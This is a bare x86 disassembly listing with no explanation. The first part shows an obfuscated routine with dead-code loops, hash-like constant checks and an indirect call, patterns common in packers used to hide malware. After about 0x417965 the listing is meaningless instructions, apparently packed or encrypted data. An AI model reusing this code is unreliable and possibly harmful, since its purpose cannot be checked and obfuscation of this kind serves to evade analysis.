  41730b:	mov    eax,DWORD PTR [ebp-0x14]
  41730e:	mov    DWORD PTR [eax],0x675565e9
  417314:	mov    DWORD PTR [eax+0x4],0x76576787
  41731b:	mov    eax,DWORD PTR [ebp-0x8]
  41731e:	mov    ecx,DWORD PTR [ebp-0x14]
  417321:	push   DWORD PTR [ebp-0x24]
  417324:	mov    DWORD PTR [ecx+0x1],eax
  417327:	mov    eax,ds:0x426145
  41732c:	push   DWORD PTR [eax]
  41732e:	push   DWORD PTR ds:0x4263a9
  417334:	push   DWORD PTR ds:0x42614d
  41733a:	push   DWORD PTR ds:0x426389
  417340:	push   DWORD PTR ds:0x426cc9
  417346:	push   DWORD PTR [ebp-0x28]
  417349:	push   DWORD PTR [ebp-0x2c]
  41734c:	mov    eax,DWORD PTR [ebp-0x14]
  41734f:	call   eax
  417351:	pop    edi
  417352:	pop    esi
  417353:	leave  
  417354:	ret    
  417355:	push   ebp
  417356:	mov    ebp,esp
  417358:	sub    esp,0x34
  41735b:	neg    edx
  41735d:	push   ebx
  41735e:	adc    edx,ecx
  417360:	push   esi
  417361:	push   edi
  417362:	xor    ecx,0x2a8a
  417368:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  41736f:	mov    edx,DWORD PTR ds:0x429d51
  417375:	xor    esi,esi
  417377:	xor    esi,DWORD PTR ds:0x429d65
  41737d:	sub    esi,edx
  41737f:	add    edx,DWORD PTR [edx+esi*1]
  417382:	lea    eax,[ebp+0x14]
  417385:	sub    ecx,0x2a97
  41738b:	mov    DWORD PTR [ebp-0x4],eax
  41738e:	sub    DWORD PTR ds:0x426e8d,0x3cd0
  417398:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  41739f:	xor    DWORD PTR ds:0x426ea1,ebx
  4173a5:	lea    eax,[ebp-0xc]
  4173a8:	add    esi,ecx
  4173aa:	mov    DWORD PTR [ebp-0x14],eax
  4173ad:	xor    DWORD PTR ds:0x426f29,ecx
  4173b3:	mov    eax,DWORD PTR [ebp-0xc]
  4173b6:	or     ecx,edx
  4173b8:	mov    edx,DWORD PTR [ebp-0x14]
  4173bb:	mov    ecx,DWORD PTR ds:0x426f4d
  4173c1:	mov    esi,DWORD PTR ds:0x429d65
  4173c7:	sub    ecx,esi
  4173c9:	imul   ecx,DWORD PTR [ecx+esi*1]
  4173cd:	mov    ecx,0x75108b3
  4173d2:	and    DWORD PTR ds:0x426eb9,0x0
  4173dc:	xor    esi,esi
  4173de:	add    esi,DWORD PTR ds:0x426eb9
  4173e4:	inc    esi
  4173e5:	mov    DWORD PTR ds:0x426eb9,esi
  4173eb:	cmp    DWORD PTR ds:0x426eb9,0x9
  4173f2:	jle    0x41742f
  4173f8:	jmp    0x417408
  4173fd:	push   0x8342
  417402:	call   DWORD PTR ds:0x430a3c
  417408:	cmp    DWORD PTR ds:0x426eb9,0x8
  41740f:	jne    0x417422
  417415:	mov    esi,DWORD PTR ds:0x426eb9
  41741b:	inc    esi
  41741c:	mov    DWORD PTR ds:0x426eb9,esi
  417422:	cmp    DWORD PTR ds:0x426eb9,0x10
  417429:	jb     0x4173dc
  41742f:	xor    eax,ecx
  417431:	mov    esi,DWORD PTR ds:0x426eb9
  417437:	xor    esi,DWORD PTR ds:0x426f0d
  41743d:	mov    DWORD PTR ds:0x426eb9,esi
  417443:	add    eax,0x3272fa
  417448:	xor    esi,0x7991
  41744e:	mov    DWORD PTR [edx],eax
  417450:	mov    eax,ds:0x426141
  417455:	mov    edx,DWORD PTR [ebp-0x4]
  417458:	mov    eax,DWORD PTR [eax]
  41745a:	add    eax,DWORD PTR [edx]
  41745c:	and    DWORD PTR ds:0x426ed9,edx
  417462:	mov    DWORD PTR [ebp-0x8],eax
  417465:	and    DWORD PTR ds:0x426ecd,0x0
  41746f:	mov    edx,DWORD PTR ds:0x426ecd
  417475:	inc    edx
  417476:	mov    DWORD PTR ds:0x426ecd,edx
  41747c:	cmp    DWORD PTR ds:0x426ecd,0x5
  417483:	ja     0x4174d7
  417489:	jmp    0x4174b0
  41748e:	push   0x426ecd
  417493:	push   0x17b9
  417498:	push   0x1b0d
  41749d:	push   0x1721
  4174a2:	push   DWORD PTR [ebp-0xc]
  4174a5:	push   0x619f
  4174aa:	call   DWORD PTR ds:0x430a40
  4174b0:	cmp    DWORD PTR ds:0x426ecd,0x4
  4174b7:	jne    0x4174ca
  4174bd:	mov    edx,DWORD PTR ds:0x426ecd
  4174c3:	inc    edx
  4174c4:	mov    DWORD PTR ds:0x426ecd,edx
  4174ca:	cmp    DWORD PTR ds:0x426ecd,0x11
  4174d1:	jb     0x41746f
  4174d7:	mov    esi,DWORD PTR [ebp+0x8]
  4174da:	and    DWORD PTR ds:0x426e81,0x0
  4174e4:	mov    eax,ds:0x426e81
  4174e9:	inc    eax
  4174ea:	mov    ds:0x426e81,eax
  4174ef:	cmp    DWORD PTR ds:0x426e81,0x9
  4174f6:	ja     0x417532
  4174fc:	jmp    0x41750a
  417501:	push   DWORD PTR [ebp-0x14]
  417504:	call   DWORD PTR ds:0x430a0c
  41750a:	cmp    DWORD PTR ds:0x426e81,0x8
  417511:	jne    0x417525
  417517:	xor    eax,eax
  417519:	xor    eax,DWORD PTR ds:0x426e81
  41751f:	inc    eax
  417520:	mov    ds:0x426e81,eax
  417525:	cmp    DWORD PTR ds:0x426e81,0x18
  41752c:	jb     0x4174e4
  417532:	mov    eax,ds:0x4262c9
  417537:	and    DWORD PTR ds:0x426e99,0x0
  417541:	mov    edx,DWORD PTR ds:0x426e99
  417547:	inc    edx
  417548:	mov    DWORD PTR ds:0x426e99,edx
  41754e:	cmp    DWORD PTR ds:0x426e99,0xa
  417555:	jbe    0x417595
  41755b:	jmp    0x41756e
  417560:	push   DWORD PTR [ebp-0x14]
  417563:	push   0x426035
  417568:	call   DWORD PTR ds:0x430a44
  41756e:	cmp    DWORD PTR ds:0x426e99,0x9
  417575:	jne    0x417588
  41757b:	mov    edx,DWORD PTR ds:0x426e99
  417581:	inc    edx
  417582:	mov    DWORD PTR ds:0x426e99,edx
  417588:	cmp    DWORD PTR ds:0x426e99,0x1f
  41758f:	jb     0x417541
  417595:	mov    eax,DWORD PTR [eax+0x198]
  41759b:	xor    DWORD PTR ds:0x426efd,0x2868
  4175a5:	xor    esi,ecx
  4175a7:	mov    edx,DWORD PTR ds:0x426e91
  4175ad:	sbb    edx,DWORD PTR ds:0x426f1d
  4175b3:	mov    DWORD PTR ds:0x426e91,edx
  4175b9:	mov    edx,0x3272fa
  4175be:	add    esi,edx
  4175c0:	cmp    DWORD PTR [eax],esi
  4175c2:	mov    DWORD PTR ds:0x426f25,0x290b
  4175cc:	je     0x4175d9
  4175d2:	mov    eax,DWORD PTR [eax]
  4175d4:	jmp    0x41c1c5
  4175d9:	and    DWORD PTR ds:0x426e85,0x0
  4175e3:	jmp    0x4175f5
  4175e8:	mov    esi,DWORD PTR ds:0x426e85
  4175ee:	inc    esi
  4175ef:	mov    DWORD PTR ds:0x426e85,esi
  4175f5:	cmp    DWORD PTR ds:0x426e85,0x15
  4175fc:	jae    0x417657
  417602:	cmp    DWORD PTR ds:0x426e85,0xd
  417609:	jge    0x417657
  41760f:	jmp    0x417636
  417614:	push   DWORD PTR [ebp-0x14]
  417617:	push   0x2c9c
  41761c:	push   DWORD PTR [ebp-0x28]
  41761f:	push   0x295b
  417624:	push   DWORD PTR [ebp-0x24]
  417627:	push   DWORD PTR [ebp-0x24]
  41762a:	push   DWORD PTR [ebp-0x14]
  41762d:	push   DWORD PTR [ebp-0x1c]
  417630:	call   DWORD PTR ds:0x430a10
  417636:	cmp    DWORD PTR ds:0x426e85,0xc
  41763d:	jne    0x417652
  417643:	xor    esi,esi
  417645:	xor    esi,DWORD PTR ds:0x426e85
  41764b:	inc    esi
  41764c:	mov    DWORD PTR ds:0x426e85,esi
  417652:	jmp    0x4175e8
  417657:	mov    eax,DWORD PTR [ebp+0x18]
  41765a:	and    DWORD PTR ds:0x426f09,0x0
  417664:	jmp    0x417678
  417669:	xor    esi,esi
  41766b:	or     esi,DWORD PTR ds:0x426f09
  417671:	inc    esi
  417672:	mov    DWORD PTR ds:0x426f09,esi
  417678:	cmp    DWORD PTR ds:0x426f09,0x1e
  41767f:	jae    0x4176a2
  417685:	cmp    DWORD PTR ds:0x426f09,0x29
  41768c:	jl     0x4176a2
  417692:	jmp    0x41769d
  417697:	call   DWORD PTR ds:0x430a14
  41769d:	jmp    0x417669
  4176a2:	mov    esi,DWORD PTR [ebp+0x1c]
  4176a5:	or     ebx,0xffffffff
  4176a8:	mov    DWORD PTR ds:0x426e91,0x369f
  4176b2:	cmp    eax,0x70941f8a
  4176b7:	mov    DWORD PTR ds:0x426ec9,0x473e
  4176c1:	jne    0x417702
  4176c7:	mov    DWORD PTR ds:0x426edd,0x672c
  4176d1:	cmp    esi,ebx
  4176d3:	jne    0x417702
  4176d9:	mov    DWORD PTR ds:0x426f05,0x6cc9
  4176e3:	push   ebx
  4176e4:	mov    DWORD PTR ds:0x426edd,0x7b40
  4176ee:	push   0x70941f97
  4176f3:	mov    DWORD PTR ds:0x426eb5,0xfd5
  4176fd:	jmp    0x41c1b4
  417702:	not    eax
  417704:	mov    eax,DWORD PTR [ebp+0x18]
  417707:	mov    esi,DWORD PTR [ebp+0x1c]
  41770a:	cmp    eax,0x70941f97
  41770f:	jne    0x41773c
  417715:	mov    DWORD PTR ds:0x426e9d,0x16ae
  41771f:	cmp    esi,ebx
  417721:	jne    0x41773c
  417727:	mov    DWORD PTR ds:0x426f29,0x795f
  417731:	push   ebx
  417732:	push   0x70941f94
  417737:	jmp    0x41c1b4
  41773c:	mov    eax,0x27d6
  417741:	mov    eax,DWORD PTR [ebp+0x18]
  417744:	mov    esi,DWORD PTR [ebp+0x1c]
  417747:	mov    DWORD PTR ds:0x426e89,0x6099
  417751:	cmp    eax,0x70941f94
  417756:	mov    DWORD PTR ds:0x426f25,0x7197
  417760:	jne    0x417797
  417766:	mov    DWORD PTR ds:0x426ea9,0x1c69
  417770:	cmp    esi,ebx
  417772:	mov    DWORD PTR ds:0x426e99,0x2feb
  41777c:	jne    0x417797
  417782:	push   ebx
  417783:	mov    DWORD PTR ds:0x426f05,0xf40
  41778d:	push   0x70941f91
  417792:	jmp    0x41c1b4
  417797:	mov    eax,DWORD PTR [ebp+0x18]
  41779a:	mov    esi,DWORD PTR [ebp+0x1c]
  41779d:	cmp    eax,0x70941f91
  4177a2:	mov    DWORD PTR ds:0x426ea5,0x751d
  4177ac:	jne    0x4177e3
  4177b2:	mov    DWORD PTR ds:0x426ebd,0x378d
  4177bc:	cmp    esi,ebx
  4177be:	mov    DWORD PTR ds:0x426ef9,0x65e8
  4177c8:	jne    0x4177e3
  4177ce:	push   ebx
  4177cf:	push   0x70941f9e
  4177d4:	mov    DWORD PTR ds:0x426f01,0x54ba
  4177de:	jmp    0x41c1b4
  4177e3:	movzx  eax,BYTE PTR ds:0x426ef1
  4177ea:	mov    eax,DWORD PTR [ebp+0x18]
  4177ed:	mov    esi,DWORD PTR [ebp+0x1c]
  4177f0:	mov    edi,0x70941fa5
  4177f5:	mov    DWORD PTR ds:0x426f1d,0x1da7
  4177ff:	cmp    eax,edi
  417801:	mov    DWORD PTR ds:0x426f19,0x3c14
  41780b:	jne    0x41c152
  417811:	mov    DWORD PTR ds:0x426eb5,0x795b
  41781b:	cmp    esi,ebx
  41781d:	jne    0x41c152
  417823:	sub    edi,eax
  417825:	mov    eax,DWORD PTR [ebp+0x10]
  417828:	mov    DWORD PTR ds:0x426f15,0x1d
  417832:	cmp    DWORD PTR ds:0x426f15,0x0
  417839:	je     0x41788f
  41783f:	cmp    DWORD PTR ds:0x426f15,0x8
  417846:	jle    0x41788f
  41784c:	jmp    0x417861
  417851:	push   0x426f01
  417856:	push   0x6b2f
  41785b:	call   DWORD PTR ds:0x430a48
  417861:	cmp    DWORD PTR ds:0x426f15,0x9
  417868:	jne    0x41787d
  41786e:	xor    edi,edi
  417870:	or     edi,DWORD PTR ds:0x426f15
  417876:	dec    edi
  417877:	mov    DWORD PTR ds:0x426f15,edi
  41787d:	mov    edi,DWORD PTR ds:0x426f15
  417883:	dec    edi
  417884:	mov    DWORD PTR ds:0x426f15,edi
  41788a:	jmp    0x417832
  41788f:	xor    eax,ecx
  417891:	add    eax,edx
  417893:	mov    DWORD PTR [ebp-0x20],eax
  417896:	mov    eax,DWORD PTR [ebp+0xc]
  417899:	mov    esi,DWORD PTR [ebp-0x8]
  41789c:	xor    eax,ecx
  41789e:	add    eax,edx
  4178a0:	imul   eax,DWORD PTR [esi]
  4178a3:	mov    esi,DWORD PTR [ebp+0x8]
  4178a6:	xor    esi,ecx
  4178a8:	add    esi,edx
  4178aa:	cmp    esi,eax
  4178ac:	mov    eax,DWORD PTR [ebp-0x4]
  4178af:	mov    edi,0xffcd8d06
  4178b4:	je     0x4178d3
  4178ba:	mov    esi,DWORD PTR [ebp-0x20]
  4178bd:	add    DWORD PTR [eax],esi
  4178bf:	mov    eax,DWORD PTR [ebp-0x4]
  4178c2:	mov    esi,DWORD PTR [ebp+0xc]
  4178c5:	xor    esi,ecx
  4178c7:	add    esi,edx
  4178c9:	imul   esi,DWORD PTR [eax]
  4178cc:	mov    DWORD PTR [eax],esi
  4178ce:	jmp    0x4178d8
  4178d3:	mov    esi,DWORD PTR [ebp+0x14]
  4178d6:	xor    DWORD PTR [eax],esi
  4178d8:	mov    eax,DWORD PTR [ebp-0x4]
  4178db:	mov    esi,DWORD PTR [ebp+0x10]
  4178de:	xor    esi,ecx
  4178e0:	sub    edi,esi
  4178e2:	add    DWORD PTR [eax],edi
  4178e4:	mov    eax,DWORD PTR [ebp-0x4]
  4178e7:	mov    esi,DWORD PTR [ebp-0x8]
  4178ea:	add    esi,DWORD PTR [eax]
  4178ec:	mov    DWORD PTR [ebp-0x8],esi
  4178ef:	mov    eax,DWORD PTR [ebp+0xc]
  4178f2:	mov    esi,DWORD PTR [ebp+0xc]
  4178f5:	xor    esi,ecx
  4178f7:	xor    eax,ecx
  4178f9:	lea    eax,[eax+esi*1+0x64e5f4]
  417900:	mov    esi,DWORD PTR [ebp+0xc]
  417903:	xor    esi,ecx
  417905:	add    esi,edx
  417907:	imul   eax,esi
  41790a:	mov    esi,DWORD PTR [ebp+0xc]
  41790d:	xor    esi,ecx
  41790f:	sub    esi,eax
  417911:	mov    eax,DWORD PTR [ebp-0x4]
  417914:	add    esi,edx
  417916:	cmp    DWORD PTR [eax],esi
  417918:	mov    eax,DWORD PTR [ebp-0x4]
  41791b:	mov    esi,DWORD PTR [ebp+0x10]
  41791e:	jg     0x417934
  417924:	xor    esi,ecx
  417926:	mov    edi,0xffcd8d06
  41792b:	sub    edi,esi
  41792d:	add    DWORD PTR [eax],edi
  41792f:	jmp    0x41793a
  417934:	xor    esi,ecx
  417936:	add    esi,edx
  417938:	add    DWORD PTR [eax],esi
  41793a:	mov    eax,DWORD PTR [ebp-0x8]
  41793d:	mov    esi,DWORD PTR [ebp-0x10]
  417940:	mov    eax,DWORD PTR [eax]
  417942:	xor    esi,ecx
  417944:	add    esi,0x3272f9
  41794a:	mov    DWORD PTR [ebp-0x28],0x7097b85d
  417951:	mov    DWORD PTR [ebp-0x24],ebx
  417954:	not    esi
  417956:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  41795d:	mov    DWORD PTR [ebp-0x2c],ebx
  417960:	jmp    0x419cec
  417965:	mov    bh,0xd2
  417967:	jae    0x417925
  417969:	jbe    0x4179c7
  41796b:	cmp    al,bh
  41796d:	add    BYTE PTR [edx],dl
  41796f:	sti    
  417970:	or     ah,BYTE PTR [edx-0x7b23bf2e]
  417976:	mov    eax,0x9ce87b7a
  41797b:	jnp    0x4179f8
  41797d:	cmp    al,ch
  41797f:	call   0x1448:0x66bf1536
  417986:	stos   DWORD PTR es:[edi],eax
  417987:	daa    
  417988:	(bad)  
  417989:	or     DWORD PTR [edi],esp
  41798b:	mov    al,0x42
  41798d:	push   es
  41798e:	pop    ebp
  41798f:	inc    ecx
  417990:	or     esi,edx
  417992:	dec    edi
  417993:	inc    ebx
  417994:	pop    ss
  417995:	pop    esi
  417996:	mov    edi,0x4c6a66e8
  41799b:	xchg   edx,eax
  41799c:	int    0x3e
  41799e:	xchg   esp,eax
  41799f:	or     DWORD PTR [edx+0x25],edi
  4179a2:	stos   DWORD PTR es:[edi],eax
  4179a3:	sar    ecx,0xfb
  4179a6:	imul   edi,DWORD PTR [esi],0x1f
  4179a9:	jecxz  0x41794c
  4179ab:	mov    eax,ds:0x4eb0e74a
  4179b0:	neg    eax
  4179b2:	pushf  
  4179b3:	sbb    eax,0x2dfcb642
  4179b8:	sahf   
  4179b9:	mov    ds:0x6a6336bf,al
  4179be:	mov    al,ds:0xe835ce53
  4179c3:	retf   
  4179c4:	lock sbb BYTE PTR [esi-0x4ccab487],al
  4179cb:	(bad)  
  4179cc:	in     al,dx
  4179cd:	jns    0x417975
  4179cf:	out    dx,eax
  4179d0:	ret    0x136d
  4179d3:	out    0x79,eax
  4179d5:	aad    0x38
  4179d7:	(bad)  
  4179d8:	push   ss
  4179d9:	mov    bl,0xd9
  4179db:	push   edi
  4179dc:	inc    edx
  4179dd:	mov    gs,esp
  4179df:	call   0xd800bdc9
  4179e4:	clc    
  4179e5:	mov    ds:0x85cc7906,al
  4179ea:	sbb    BYTE PTR [edi+0x10ce5d5],ch
  4179f0:	popa   
  4179f1:	xchg   ecx,eax
  4179f2:	outs   dx,DWORD PTR ds:[esi]
  4179f3:	mov    dh,0x99
  4179f5:	add    al,0x3b
  4179f7:	jnp    0x417a1c
  4179f9:	dec    edx
  4179fa:	ja     0x417a5a
  4179fc:	cmp    BYTE PTR [ebx-0x2ed557d8],0x96
  417a03:	into   
  417a04:	cmp    al,0xaf
  417a06:	ins    BYTE PTR es:[edi],dx
  417a07:	test   DWORD PTR [ecx-0x10],edx
  417a0a:	repnz fild QWORD PTR [esi+0x6e]
  417a0e:	xchg   ecx,eax
  417a0f:	and    DWORD PTR [eax-0x4a],edx
  417a12:	xor    BYTE PTR [edi+edi*1+0x1f],0xc4
  417a17:	ret    
  417a18:	dec    ecx
  417a19:	lea    edx,ds:0x66a48a32
  417a1f:	and    BYTE PTR [ecx-0x316e88c9],0xe2
  417a26:	mov    eax,ds:0xe4ff7ef7
  417a2b:	cmc    
  417a2c:	das    
  417a2d:	and    eax,0x94663a2e
  417a32:	aaa    
  417a33:	cmp    ah,BYTE PTR [ecx+0x5d]
  417a36:	xchg   edx,eax
  417a37:	add    al,0x46
  417a39:	call   0xc155:0x47b9ea76
  417a40:	jmp    0xa235e69f
  417a45:	push   ecx
  417a46:	imul   ecx,DWORD PTR [eax+0x1e],0xffffffe4
  417a4a:	cmc    
  417a4b:	icebp  
  417a4c:	push   eax
  417a4d:	lock mov al,0x3f
  417a50:	mov    ds,ebp
  417a52:	cwde   
  417a53:	pusha  
  417a54:	in     eax,dx
  417a55:	inc    esi
  417a56:	(bad)  
  417a58:	adc    BYTE PTR [eax+0x64],ch
  417a5b:	inc    edx
  417a5c:	mov    cl,0x0
  417a5e:	(bad)
  417a61:	mov    eax,ds:0x9b24fd51
  417a66:	push   ss
  417a67:	dec    ecx
  417a68:	add    BYTE PTR [eax],0xed
  417a6b:	ins    DWORD PTR es:[edi],dx
  417a6c:	aas    
  417a6d:	xchg   ebx,eax
  417a6e:	jns    0x417aa5
  417a70:	call   0x90e5:0x64769792
  417a77:	sbb    al,0xa0
  417a79:	pop    eax
  417a7a:	popa   
  417a7b:	and    DWORD PTR [esi+0x28],ebp
  417a7e:	ficomp DWORD PTR [ebp+ebx*1-0x1946ba39]
  417a85:	add    al,0x35
  417a87:	or     eax,0x38cf708d
  417a8c:	dec    BYTE PTR [ebx+0x34fde8c4]
  417a92:	clc    
  417a93:	lock gs pop esi
  417a96:	mov    al,ds:0x50eb816b
  417a9b:	or     ebx,esp
  417a9d:	mov    bl,0x68
  417a9f:	lods   al,BYTE PTR ds:[esi]
  417aa0:	test   al,0x2b
  417aa2:	out    0x9c,eax
  417aa4:	inc    esp
  417aa5:	test   al,0x22
  417aa7:	jmp    0x417a50
  417aa9:	cwde   
  417aaa:	out    dx,eax
  417aab:	or     ah,BYTE PTR [ebx]
  417aad:	dec    esi
  417aae:	pusha  
  417aaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ab0:	add    al,0xfe
  417ab2:	js     0x417b14
  417ab4:	ror    BYTE PTR [ecx-0x56f0896],cl
  417aba:	mov    cl,0x7a
  417abc:	sbb    al,0x54
  417abe:	not    BYTE PTR ds:0x93196b4d
  417ac4:	pop    ss
  417ac5:	pop    ss
  417ac6:	sub    DWORD PTR [ecx+ebx*8-0x59],edi
  417aca:	or     bh,BYTE PTR [esi]
  417acc:	sub    BYTE PTR [esi-0x32d50364],al
  417ad2:	je     0x417a69
  417ad4:	cmc    
  417ad5:	or     ch,BYTE PTR [edx]
  417ad7:	inc    ebp
  417ad8:	enter  0x4b02,0xaa
  417adc:	test   DWORD PTR [edx+0x4b84b290],ecx
  417ae2:	add    bh,BYTE PTR [eax+0x52]
  417ae5:	call   0x9d3a:0x459dce54
  417aec:	mov    ecx,0x88e5aad4
  417af1:	push   ebx
  417af2:	sbb    dh,BYTE PTR [edx+0x2c]
  417af5:	nop
  417af6:	hlt    
  417af7:	pop    esi
  417af8:	dec    eax
  417af9:	xor    eax,0x67f3fd56
  417afe:	pusha  
  417aff:	dec    edx
  417b00:	pushf  
  417b01:	inc    ebx
  417b02:	ins    BYTE PTR es:[edi],dx
  417b03:	or     DWORD PTR [ebp-0x4e],esp
  417b06:	sar    esp,cl
  417b08:	jbe    0x417abc
  417b0a:	pop    es
  417b0b:	dec    edx
  417b0c:	in     eax,0x26
  417b0e:	shr    DWORD PTR ds:0xb0624fd8,cl
  417b14:	push   ecx
  417b15:	sub    ebp,ebx
  417b17:	in     al,dx
  417b18:	mov    DWORD PTR [edi-0x486137aa],esi
  417b1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b1f:	out    dx,al
  417b20:	rol    ebp,cl
  417b22:	call   0x699e7805
  417b27:	in     eax,dx
  417b28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b29:	inc    ebx
  417b2a:	test   al,0xc9
  417b2c:	nop
  417b2d:	pop    esi
  417b2e:	je     0x417b5c
  417b30:	leave  
  417b31:	iret   
  417b32:	mov    edx,edx
  417b34:	nop
  417b35:	sbb    al,0x1b
  417b37:	pop    esp
  417b38:	xchg   esi,eax
  417b39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b3a:	test   eax,0x50707128
  417b3f:	loopne 0x417bb8
  417b41:	sbb    ch,BYTE PTR cs:[ebp+0x65e14305]
  417b48:	std    
  417b49:	adc    esp,DWORD PTR [ebp+0x51]
  417b4c:	sbb    ch,ch
  417b4e:	sub    DWORD PTR [edi],ebp
  417b50:	clc    
  417b51:	adc    eax,0xa02222c9
  417b56:	inc    edi
  417b57:	out    dx,al
  417b58:	fadd   QWORD PTR [ebx+0x3bd4bfe1]
  417b5e:	cdq    
  417b5f:	inc    esp
  417b60:	ss mov ecx,0x2225487f
  417b66:	or     eax,0x1ed499d8
  417b6b:	and    ecx,DWORD PTR [eax]
  417b6d:	fs jge 0x417b4a
  417b70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b71:	adc    eax,0xca44da
  417b76:	jae    0x417be1
  417b78:	mov    ds:0x9758d71b,al
  417b7d:	xchg   esi,eax
  417b7e:	fwait
  417b7f:	push   ecx
  417b80:	add    eax,0xb8f668f2
  417b85:	adc    eax,0x494da782
  417b8a:	add    BYTE PTR [edi],ah
  417b8c:	dec    ebp
  417b8d:	adc    al,0xc3
  417b8f:	inc    esi
  417b90:	stos   DWORD PTR es:[edi],eax
  417b91:	test   al,0x6e
  417b93:	xor    eax,DWORD PTR [ebx-0x3de4604d]
  417b99:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  417b9b:	push   ecx
  417b9c:	pop    esp
  417b9d:	add    edx,0x25
  417ba0:	sub    eax,0x43138509
  417ba5:	dec    edx
  417ba6:	pop    ss
  417ba7:	and    eax,0xf2776a49
  417bac:	or     al,0xc8
  417bae:	cmp    DWORD PTR [edi*2+0xc4ccb8e],0xf4af8e10
  417bb9:	fsubr  QWORD PTR [ecx+0x2]
  417bbc:	add    BYTE PTR gs:[esi+0x1f],ah
  417bc0:	inc    ebp
  417bc1:	fnstsw WORD PTR [eax+0x45]
  417bc4:	mov    dl,0x83
  417bc6:	or     edi,DWORD PTR [edi+0x58310922]
  417bcc:	mov    esi,0xea8bc3a2
  417bd1:	cmp    al,0xd1
  417bd3:	sub    ah,bh
  417bd5:	sbb    ecx,DWORD PTR [eax-0x4]
  417bd8:	fdivr  st(4),st
  417bda:	or     ebp,ebx
  417bdc:	adc    ebx,DWORD PTR [ecx+0x74]
  417bdf:	out    0x37,eax
  417be1:	or     al,0x3b
  417be3:	add    DWORD PTR ds:0xaa169e3f,esp
  417be9:	out    0xa,al
  417beb:	ret    0x7055
  417bee:	sub    DWORD PTR [eax+0x20],0x13
  417bf2:	and    dh,BYTE PTR [ecx]
  417bf4:	adc    dl,BYTE PTR [ebp-0x3777163e]
  417bfa:	hlt    
  417bfb:	fs std 
  417bfd:	aaa    
  417bfe:	mov    gs,WORD PTR [edi+edi*8-0x73f607e7]
  417c05:	xchg   edi,eax
  417c06:	aas    
  417c07:	shl    DWORD PTR [edi+0x50ecc4b6],1
  417c0d:	inc    esi
  417c0e:	(bad)  
  417c10:	xchg   ebp,ecx
  417c12:	pop    edx
  417c13:	bound  eax,QWORD PTR [ebx+0x7c]
  417c16:	add    eax,0x32d9118a
  417c1b:	das    
  417c1c:	mov    eax,ds:0xce9dfc2
  417c21:	test   BYTE PTR [edi-0x43],bl
  417c24:	push   0xe4377896
  417c29:	(bad)  
  417c2a:	xor    al,0x3c
  417c2c:	cmp    eax,0x7ea03e99
  417c31:	jg     0x417c93
  417c33:	push   esp
  417c34:	or     ebx,esp
  417c36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c37:	push   cs
  417c38:	dec    ebx
  417c39:	sbb    al,0xfb
  417c3b:	xor    BYTE PTR [eax-0x5ade8f86],bh
  417c41:	sub    eax,0xc8f249a9
  417c46:	mov    ?,eax
  417c48:	mov    esi,0x447afa3c
  417c4d:	dec    esp
  417c4e:	sbb    BYTE PTR [esi+0x1bfe7982],dl
  417c54:	xor    eax,DWORD PTR [esi+0x3c]
  417c57:	mov    bh,0xb
  417c59:	jmp    0x417c63
  417c5b:	add    bl,BYTE PTR [edx+0x7ef8138d]
  417c61:	xor    eax,0x2499cd97
  417c66:	add    al,0x2d
  417c68:	aas    
  417c69:	aas    
  417c6a:	test   eax,0x7eb4c4f4
  417c6f:	sti    
  417c70:	test   eax,0x8fd6909
  417c75:	xchg   dl,ah
  417c77:	shl    BYTE PTR [edi],0xaa
  417c7a:	out    0xab,al
  417c7c:	and    dh,BYTE PTR [ebp-0x3396f0c4]
  417c82:	push   es
  417c83:	test   DWORD PTR [edi+0x36],ecx
  417c86:	sub    eax,DWORD PTR [edx*4+0x52a05063]
  417c8d:	add    BYTE PTR [ebx-0x33],ah
  417c90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c92:	jmp    0x417c78
  417c94:	add    DWORD PTR [ebp+0x14],0x70
  417c98:	xchg   esi,eax
  417c99:	dec    edi
  417c9a:	jo     0x417d18
  417c9c:	out    dx,eax
  417c9d:	retf   
  417c9e:	sub    al,0x13
  417ca0:	jle    0x417c50
  417ca2:	shl    DWORD PTR ds:0x8bf5dd1f,1
  417ca8:	jns    0x417d19
  417caa:	push   ss
  417cab:	jmp    0x417c4c
  417cad:	ror    BYTE PTR [eax+0x4e],0x7e
  417cb1:	push   ss
  417cb2:	hlt    
  417cb3:	dec    esp
  417cb4:	inc    eax
  417cb5:	sub    ecx,DWORD PTR [esi]
  417cb7:	shl    DWORD PTR [ecx],0x40
  417cba:	adc    bh,BYTE PTR [esi-0x68]
  417cbd:	pop    edx
  417cbe:	jecxz  0x417c8c
  417cc0:	outs   dx,DWORD PTR ds:[esi]
  417cc1:	add    eax,DWORD PTR [ebp-0x2258dc22]
  417cc7:	cli    
  417cc8:	adc    esp,0xffffffab
  417ccb:	sub    ch,BYTE PTR [edi+0x48dfcff]
  417cd1:	push   es
  417cd2:	jo     0x417c6f
  417cd4:	lock push 0x69
  417cd7:	add    eax,0xe0cbc54a
  417cdc:	enter  0x369d,0xa7
  417ce0:	pop    ebx
  417ce1:	enter  0xb3f2,0x1a
  417ce5:	dec    edi
  417ce6:	mov    ds:0xa724b657,eax
  417ceb:	xor    DWORD PTR [edi+0x3b],edx
  417cee:	std    
  417cef:	adc    al,0x6f
  417cf1:	imul   ebp,DWORD PTR [esi-0x14560295],0xffffff86
  417cf8:	sub    ecx,edi
  417cfa:	ja     0x417d43
  417cfc:	pop    ebx
  417cfd:	(bad)  
  417cfe:	push   edx
  417cff:	jge    0x417ca0
  417d01:	or     bl,bh
  417d03:	pop    ebp
  417d04:	inc    ecx
  417d05:	add    al,0xd4
  417d07:	hlt    
  417d08:	mov    edx,0x5de1c53c
  417d0d:	ret    
  417d0e:	push   eax
  417d0f:	and    BYTE PTR [ecx],ah
  417d11:	iret   
  417d12:	pop    ecx
  417d13:	inc    ebx
  417d14:	ins    DWORD PTR es:[edi],dx
  417d15:	clc    
  417d16:	shr    DWORD PTR [ecx-0x9],0xdc
  417d1a:	push   es
  417d1b:	out    0x9e,al
  417d1d:	xchg   esp,eax
  417d1e:	lods   al,BYTE PTR ds:[esi]
